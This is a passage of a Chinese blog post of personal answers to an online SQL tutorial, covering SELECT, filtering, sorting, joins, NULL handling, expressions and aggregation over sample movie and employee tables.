</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> widget_sales</span><br><span class="line"><span class="keyword">ON</span> mywidgets.id = widget_sales.widget_id;</span><br></pre></td></tr></table></figure><p>对全部结果数据做统计</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> AGG_FUNC(\column_or_expression\) <span class="keyword">AS</span> aggregate_description, … </span><br><span class="line"><span class="keyword">FROM</span> mytable </span><br><span class="line"><span class="keyword">WHERE</span> constraint_expression;</span><br></pre></td></tr></table></figure><p>用分组的方式统计</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先对数据做WHERE，后对结果做分组</span><br><span class="line"><span class="keyword">SELECT</span> AGG_FUNC(column_or_expression) <span class="keyword">AS</span> aggregate_description, … </span><br><span class="line"><span class="keyword">FROM</span> mytable </span><br><span class="line"><span class="keyword">WHERE</span> constraint_expression </span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">column</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>Function</th><th>Description</th></tr></thead><tbody><tr><td>COUNT(*****), COUNT(column)</td><td>计数！COUNT(*) 统计数据行数，COUNT(column) 统计column非NULL的行数.</td></tr><tr><td>MIN(column)</td><td>找column最小的一行.</td></tr><tr><td>MAX(column)</td><td>找column最大的一行.</td></tr><tr><td>AVG(column)</td><td>对column所有行取平均值.</td></tr><tr><td>SUM(column)</td><td>对column所有行求和.</td></tr></tbody></table><p>用HAVING进行筛选</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可以对分组之后的数据再做<span class="keyword">SELECT</span>筛选</span><br><span class="line"><span class="keyword">SELECT</span> group_by_column, AGG_FUNC(column_expression) <span class="keyword">AS</span> aggregate_result_alias, … </span><br><span class="line"><span class="keyword">FROM</span> mytable </span><br><span class="line"><span class="keyword">WHERE</span> condition </span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">column</span> <span class="keyword">HAVING</span> \group_condition\;</span><br></pre></td></tr></table></figure><p>完整的SELECT查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> <span class="keyword">column</span>, AGG_FUNC(column_or_expression), … </span><br><span class="line"><span class="keyword">FROM</span> mytable    </span><br><span class="line"><span class="keyword">JOIN</span> another_table      </span><br><span class="line"><span class="keyword">ON</span> mytable.column = another_table.column    </span><br><span class="line"><span class="keyword">WHERE</span> constraint_expression   </span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">column</span>    </span><br><span class="line"><span class="keyword">HAVING</span> constraint_expression    </span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">column</span> <span class="keyword">ASC</span>/<span class="keyword">DESC</span>    </span><br><span class="line"><span class="keyword">LIMIT</span> <span class="keyword">count</span> <span class="keyword">OFFSET</span> <span class="keyword">COUNT</span>;</span><br></pre></td></tr></table></figure><h2 id="lesson-0"><a href="#lesson-0" class="headerlink" title="lesson 0"></a>lesson 0</h2><p>照着抄就行了</p><h2 id="lesson-1-select"><a href="#lesson-1-select" class="headerlink" title="lesson 1 select"></a>lesson 1 select</h2><ol><li><p>找到所有电影的名称<code>title</code></p><p><code>SELECT title FROM movies;</code></p></li><li><p>找到所有电影的导演</p><p><code>SELECT director FROM movies;</code></p></li><li><p>找到所有电影的名称和导演</p><p><code>SELECT title,director FROM movies;</code></p></li><li><p>找到所有电影的名称和上映年份</p><p><code>SELECT title,year FROM movies;</code></p></li><li><p>找到所有电影的所有信息</p><p><code>SELECT * FROM movies;</code></p></li><li><p>找到所有电影的名称,Id和播放时长</p><p><code>SELECT title,id,length_minutes FROM movies;</code></p></li><li><p>请列出所有电影的ID,名称和出版国(即美国)</p><p><code>SELECT title,id,&#39;美国&#39; as country FROM movies;</code></p></li></ol><h2 id="lesson-2-condition"><a href="#lesson-2-condition" class="headerlink" title="lesson 2 condition"></a>lesson 2 condition</h2><ol><li><p>找到<code>id</code>为6的电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">6</span>;</span><br></pre></td></tr></table></figure></li><li><p>找到在2000-2010年间<code>year</code>上映的电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">year</span> <span class="keyword">between</span> <span class="number">2000</span> <span class="keyword">and</span> <span class="number">2010</span>;</span><br></pre></td></tr></table></figure></li><li><p>找到不是在2000-2010年间<code>year</code>上映的电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">year</span> <span class="keyword">not</span> <span class="keyword">between</span> <span class="number">2000</span> <span class="keyword">and</span> <span class="number">2010</span>;</span><br></pre></td></tr></table></figure></li><li><p>找到头5部电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">id</span>&lt;<span class="number">6</span>;</span><br></pre></td></tr></table></figure></li><li><p>找到2010（含）年之后的电影里片长小于两个小时的片子</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">year</span> &gt;=<span class="number">2010</span></span><br><span class="line">    <span class="keyword">and</span> length_minutes&lt;<span class="number">120</span>;</span><br></pre></td></tr></table></figure></li><li><p>找到99年和09年的电影,只要列出年份和片长看下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">year</span>,length_minutes <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">year</span>=<span class="number">1999</span> <span class="keyword">or</span> <span class="keyword">year</span>=<span class="number">2009</span>;</span><br></pre></td></tr></table></figure></li></ol><h2 id="lesson-3-condition"><a href="#lesson-3-condition" class="headerlink" title="lesson 3 condition"></a>lesson 3 condition</h2><ol><li><p>找到所有<code>Toy Story</code>系列电影 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> title <span class="keyword">like</span> <span class="string">'toy story%'</span></span><br></pre></td></tr></table></figure></li><li><p>找到所有<code>John Lasseter</code>导演的电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> director <span class="keyword">like</span> <span class="string">'john lasseter'</span></span><br></pre></td></tr></table></figure></li><li><p>找到所有不是<code>John Lasseter</code>导演的电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> director <span class="keyword">not</span> <span class="keyword">like</span> <span class="string">'john lasseter'</span></span><br></pre></td></tr></table></figure></li><li><p>找到所有电影名为<code>&quot;WALL-&quot;</code>开头的电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> title <span class="keyword">like</span> <span class="string">'wall-%'</span></span><br></pre></td></tr></table></figure></li><li><p>有一部98年电影中文名《虫虫危机》请给我找出来</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">year</span> = <span class="number">1998</span></span><br></pre></td></tr></table></figure></li><li><p>找出所有Pete导演的电影,只要列出电影名,导演名和年份就可以</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> title,director,<span class="keyword">year</span> <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> director <span class="keyword">like</span> <span class="string">'pete%'</span></span><br></pre></td></tr></table></figure></li><li><p>John Lasseter导演了两个系列，一个Car系列一个Toy Story系列,请帮我列出这John Lasseter导演两个系列千禧年之后的电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> director <span class="keyword">like</span> <span class="string">'john lasseter'</span></span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">year</span>&gt;<span class="number">2000</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="lesson-4-filtering-and-sorting"><a href="#lesson-4-filtering-and-sorting" class="headerlink" title="lesson 4 filtering and sorting"></a>lesson 4 filtering and sorting</h2><ol><li><p>按导演名<code>排重</code>列出所有电影，并按导演名正序排列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">distinct</span> director <span class="keyword">FROM</span> movies</span><br></pre></td></tr></table></figure></li><li><p>列出按上映年份<code>最新</code>上线的4部电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">year</span> <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">4</span></span><br></pre></td></tr></table></figure></li><li><p>按电影名字母序<code>升序</code>排列，列出前5部电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> title <span class="keyword">asc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">5</span></span><br></pre></td></tr></table></figure></li><li><p>按电影名字母序升序排列，列出上一题<code>之后</code>的5部电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> title <span class="keyword">asc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">5</span> <span class="keyword">offset</span> <span class="number">5</span></span><br></pre></td></tr></table></figure></li><li><p>如果按片长排列，John Lasseter导演导过片长第3长的电影是哪部，列出名字即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> title <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> director <span class="keyword">like</span> <span class="string">'john lasseter'</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> length_minutes <span class="keyword">asc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>按导演名字母升序,如果导演名相同按年份降序,取前10部电影给我</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> director <span class="keyword">asc</span>,<span class="keyword">year</span> <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">10</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="lesson-5-review"><a href="#lesson-5-review" class="headerlink" title="lesson 5 review"></a>lesson 5 review</h2><ol><li><p>列出所有加拿大人的<code>Canadian</code>信息(包括所有字段)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> north_american_cities</span><br><span class="line"><span class="keyword">where</span> country <span class="keyword">like</span> <span class="string">'canada'</span></span><br></pre></td></tr></table></figure></li><li><p>列出所有美国<code>United States</code>的城市按纬度从北到南排序(包括所有字段)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> north_american_cities</span><br><span class="line"><span class="keyword">where</span> country <span class="keyword">like</span> <span class="string">'united states'</span></span><br></pre></td></tr></table></figure></li><li><p>列出所有在<code>Chicago</code>西部的城市，从西到东排序(包括所有字段)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> north_american_cities</span><br><span class="line"><span class="keyword">where</span> Longitude &lt; <span class="number">-87.629798</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> Longitude <span class="keyword">asc</span></span><br></pre></td></tr></table></figure></li><li><p>用人口数<code>population</code>排序,列出墨西哥<code>Mexico</code>最大的2个城市(包括所有字段)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> north_american_cities</span><br><span class="line"><span class="keyword">where</span> country <span class="keyword">like</span> <span class="string">'mexico'</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> population <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>列出美国<code>United States</code>人口3-4位的两个城市和他们的人口(包括所有字段)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> north_american_cities</span><br><span class="line"><span class="keyword">where</span> country <span class="keyword">like</span> <span class="string">'united states'</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> population <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">2</span> <span class="keyword">offset</span> <span class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>北美所有城市,请按国家名字母序从A-Z再按人口从多到少排列看下前10位的城市(包括所有字段)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> north_american_cities</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> country <span class="keyword">asc</span> ,population <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">10</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="lesson-6-inner-join"><a href="#lesson-6-inner-join" class="headerlink" title="lesson 6 inner join"></a>lesson 6 inner join</h2><ol><li><p>找到所有电影的线下<code>Domestic_sales</code>和线上销售额</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> Boxoffice </span><br><span class="line">    <span class="keyword">on</span> movies.id = boxoffice.movie_id</span><br></pre></td></tr></table></figure></li><li><p>找到所有线上销售额比线下销售大的电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> Boxoffice </span><br><span class="line">    <span class="keyword">on</span> movies.id = boxoffice.movie_id</span><br><span class="line"><span class="keyword">where</span> International_sales&gt;Domestic_sales</span><br></pre></td></tr></table></figure></li><li><p>找出所有电影按市场占有率<code>rating</code>倒序排列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> Boxoffice </span><br><span class="line">    <span class="keyword">on</span> movies.id = boxoffice.movie_id</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> rating <span class="keyword">desc</span></span><br></pre></td></tr></table></figure></li><li><p>每部电影按线上销售额比较,排名最靠前的导演是谁,线上销量多少</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> director,International_sales <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> Boxoffice </span><br><span class="line">    <span class="keyword">on</span> movies.id = boxoffice.movie_id</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> International_sales <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="lesson-7-outer-join"><a href="#lesson-7-outer-join" class="headerlink" title="lesson 7 outer join"></a>lesson 7 outer join</h2><ol><li><p>找到所有有雇员的办公室(<code>buildings</code>)名字 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">distinct</span> building </span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> buildings</span><br><span class="line">    <span class="keyword">on</span> employees.building = buildings.building_name</span><br></pre></td></tr></table></figure></li><li><p>找到所有办公室和他们的最大容量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Building_name,<span class="keyword">capacity</span></span><br><span class="line"><span class="keyword">FROM</span>  Buildings</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">capacity</span> <span class="keyword">desc</span></span><br></pre></td></tr></table></figure></li><li><p>找到所有办公室里的所有角色（包含没有雇员的）,并做唯一输出(<code>DISTINCT</code>)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> building_name,<span class="keyword">role</span> </span><br><span class="line"><span class="keyword">from</span> Buildings  </span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> employees  </span><br><span class="line">    <span class="keyword">on</span> Buildings.building_name =employees.building;</span><br></pre></td></tr></table></figure></li><li><p>找到所有有雇员的办公室(<code>buildings</code>)和对应的容量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> building,<span class="keyword">capacity</span> </span><br><span class="line"><span class="keyword">from</span> employees  </span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> buildings  </span><br><span class="line">    <span class="keyword">on</span> employees.building = buildings.building_name </span><br><span class="line"><span class="keyword">where</span> building <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="lesson-8-null"><a href="#lesson-8-null" class="headerlink" title="lesson 8 null"></a>lesson 8 null</h2><ol><li><p>找到雇员里还没有分配办公室的(列出名字和角色就可以)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span>,<span class="keyword">role</span> <span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">where</span> building <span class="keyword">is</span> <span class="literal">null</span></span><br></pre></td></tr></table></figure></li><li><p>找到还没有雇员的办公室</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">distinct</span> building_name <span class="keyword">FROM</span> buildings</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> employees</span><br><span class="line">    <span class="keyword">on</span> employees.building=buildings.building_name</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">name</span> <span class="keyword">is</span> <span class="literal">null</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Lesson-9-表达式"><a href="#Lesson-9-表达式" class="headerlink" title="Lesson 9 表达式"></a>Lesson 9 表达式</h2><ol><li><p>列出所有的电影ID,名字和销售总额(以百万美元为单位计算)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,title,(Domestic_sales+International_sales)/<span class="number">1000000</span> <span class="keyword">as</span> total <span class="keyword">FROM</span> movies <span class="keyword">as</span> mov</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> boxoffice <span class="keyword">as</span> box</span><br><span class="line">    <span class="keyword">on</span> mov.id = box.movie_id</span><br></pre></td></tr></table></figure></li><li><p>列出所有的电影ID,名字和市场指数(<code>Rating</code>的10倍为市场指数)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,title,rating*<span class="number">10</span> <span class="keyword">as</span> point <span class="keyword">FROM</span> movies <span class="keyword">as</span> mov</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> boxoffice <span class="keyword">as</span> box</span><br><span class="line">    <span class="keyword">on</span> mov.id = box.movie_id</span><br></pre></td></tr></table></figure></li><li><p>列出所有偶数年份的电影，需要电影ID,名字和年份</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,title,<span class="keyword">year</span> <span class="keyword">as</span> point <span class="keyword">FROM</span> movies <span class="keyword">as</span> mov</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> boxoffice <span class="keyword">as</span> box</span><br><span class="line">    <span class="keyword">on</span> mov.id = box.movie_id</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">year</span>%<span class="number">2</span>==<span class="number">0</span></span><br></pre></td></tr></table></figure></li><li><p>John Lasseter导演的每部电影每分钟值多少钱,告诉我最高的3个电影名和价值就可以</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> title,(Domestic_sales+International_sales)/length_minutes <span class="keyword">as</span> price_per_min <span class="keyword">FROM</span> movies <span class="keyword">as</span> mov</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> boxoffice <span class="keyword">as</span> box</span><br><span class="line">    <span class="keyword">on</span> mov.id = box.movie_id</span><br><span class="line"><span class="keyword">where</span> director <span class="keyword">like</span> <span class="string">'john lasseter'</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> price_per_min <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">3</span></span><br></pre></td></tr></table></figure></li><li><p>电影名最长的3部电影和他们的总销量是多少</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> title,<span class="keyword">length</span>(title),Domestic_sales+International_sales <span class="keyword">as</span> total <span class="keyword">FROM</span> movies <span class="keyword">as</span> mov</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> boxoffice <span class="keyword">as</span> box</span><br><span class="line">    <span class="keyword">on</span> mov.id = box.movie_id</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">length</span>(title) <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">3</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="lesson-10-统计1"><a href="#lesson-10-统计1" class="headerlink" title="lesson 10 统计1"></a>lesson 10 统计1</h2><ol><li><p>找出就职年份最高的雇员(列出雇员名字+年份）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span>,years_employed <span class="keyword">as</span> x <span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> x <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>按角色(<code>Role</code>)统计一下每个角色的平均就职年份</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">role</span>,<span class="keyword">avg</span>(years_employed) <span class="keyword">FROM</span> employees </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">role</span></span><br></pre></td></tr></table></figure></li><li><p>按办公室名字总计一下就职年份总和</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">sum</span>(years_employed),building <span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> building</span><br></pre></td></tr></table></figure></li><li><p>每栋办公室按人数排名,不要统计无办公室的雇员</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> building,<span class="keyword">count</span>() <span class="keyword">as</span> <span class="keyword">count</span> <span class="keyword">FROM</span> employees </span><br><span class="line"><span class="keyword">where</span> building <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span> </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> building</span><br></pre></td></tr></table></figure></li><li><p>就职1,3,5,7年的人分别占总人数的百分比率是多少(给出年份和比率”50%” 记为 50)</p><p>==这题没做出来: (,不知道错哪里==</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Years_employed,<span class="keyword">round</span>(<span class="keyword">count</span>(Years_employed)/<span class="number">15.0</span>*<span 